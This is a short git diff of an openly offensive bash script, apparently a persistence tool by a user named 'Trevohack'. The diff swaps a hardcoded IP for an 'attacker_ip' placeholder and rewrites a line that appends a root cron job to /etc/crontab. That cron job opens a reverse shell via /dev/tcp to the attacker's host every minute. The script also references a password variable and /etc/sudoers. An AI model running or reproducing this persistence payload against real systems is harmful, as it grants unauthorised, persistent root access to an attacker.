@@ -1,12 +1,12 @@
 #!/usr/local/bin/bash
 
 nick="Trevohack"
-IP="10.8.150.54"
+IP="attacker_ip"
 PORT="9999"
 WEB_PORT="80"
 
 
-echo "* * * * * root /bin/bash -c 'bash -i >& /dev/tcp/10.8.64.97/9999 0>&1'" | sudo tee -a /etc/crontab >/dev/null 2>&1
+echo "* * * * * root /bin/bash -c 'bash -i >& /dev/tcp/$IP/9999 0>&1'" | sudo tee -a /etc/crontab >/dev/null 2>&1
 pwd="treva"
 sudoers_file="/etc/sudoers"
 black='\e[0;30m'
